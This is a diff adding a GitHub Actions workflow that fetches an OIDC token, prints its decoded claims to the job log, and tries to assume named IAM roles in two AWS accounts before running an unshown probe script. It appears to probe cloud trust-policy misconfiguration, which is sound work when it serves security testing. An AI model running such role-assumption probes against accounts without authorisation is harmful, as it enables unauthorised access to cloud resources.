@@ -1,0 +1,65 @@
+name: i734 tag oidc probe
+on:
+  push:
+    tags:
+      - "*"
+  workflow_dispatch:
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  claims:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: dump oidc claims
+        run: |
+          set -euo pipefail
+          TOK=$(curl -s -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | jq -r .value)
+          P=$(echo "$TOK" | cut -d. -f2 | tr '_-' '/+')
+          while [ $(( ${#P} % 4 )) -ne 0 ]; do P="$P="; done
+          echo "OIDCCLAIMS_BEGIN"
+          echo "$P" | base64 -d 2>/dev/null || true
+          echo
+          echo "OIDCCLAIMS_END"
+
+  ecrrole:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: assume public ecr role
+        uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: arn:aws:iam::416964291864:role/github-actions-oidc-access-to-public-ecr-role
+          aws-region: us-east-1
+          role-session-name: i734ecr
+      - name: matrix
+        run: bash i734_probe.sh ecr us-east-1
+
+  s3role:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: assume s3 role
+        uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: arn:aws:iam::416964291864:role/github-actions-oidc-s3-access-role
+          aws-region: eu-west-1
+          role-session-name: i734s3b
+      - name: matrix
+        run: bash i734_probe.sh s3 eu-west-1
+
+  devtestrole:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: assume devtest ecr role
+        uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: arn:aws:iam::526077812922:role/github-actions-oidc-access-to-ecr-role
+          aws-region: us-east-1
+          role-session-name: i734dtb
+      - name: matrix
+        run: bash i734_probe.sh devtest us-east-1
